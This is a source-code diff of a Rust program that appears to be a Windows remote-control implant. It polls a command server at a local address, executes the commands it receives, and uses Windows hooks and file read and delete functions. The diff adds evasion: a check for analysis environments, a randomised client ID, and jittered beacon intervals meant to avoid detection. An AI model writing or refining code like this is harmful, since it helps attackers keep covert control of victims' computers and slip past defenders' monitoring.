@@ -2,7 +2,7 @@ mod server;
 mod system;
 mod encode;
 use std::{sync::Arc, u32};
-use system::{get_windows_version, read_file, set_windows_hook, delete_file,check_for_debugging, check_for_process, mv_file};
+use system::{get_windows_version, read_file, set_windows_hook, delete_file,check_for_analysis_behaviour};
 use tokio::time::{sleep, Duration, Sleep};
 use std::sync::atomic::{AtomicBool, Ordering};
 use rand::{Rng, SeedableRng, rngs::StdRng, rngs::OsRng};
@@ -53,11 +53,13 @@ async fn main() {
     // // check_for_debugging();
     // // check_for_process();
 
+    check_for_analysis_behaviour();
+
     const URL: &'static str = "http://127.0.0.1:5000";
 
     //All the mutex code for sharing with different threads 
     let paused = Arc::new(AtomicBool::new(false));
-    let server = Arc::new(server::Connection::new(&URL, 42));
+    let server = Arc::new(server::Connection::new(&URL, rand::thread_rng().gen_range(0..255)));
     let arch = get_windows_version();
 
     let mut counter_beconing = 0;
@@ -93,7 +95,7 @@ async fn main() {
 
     let paused_command = Arc::clone(&paused);
     
-    //thread that request for commands
+    //thread that requests server
     tokio::spawn(async move {
         let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");
         loop {
@@ -104,7 +106,7 @@ async fn main() {
             
             let rec = unwrap_or_panic!(server_for_command.get_command(&id_command).await);
             execute_command(&rec, paused_command.clone()).await;
-            sleep(Duration::from_secs(3)).await;
+            sleep(Duration::from_secs(rng.gen_range(10..40))).await;
         }
     });
 
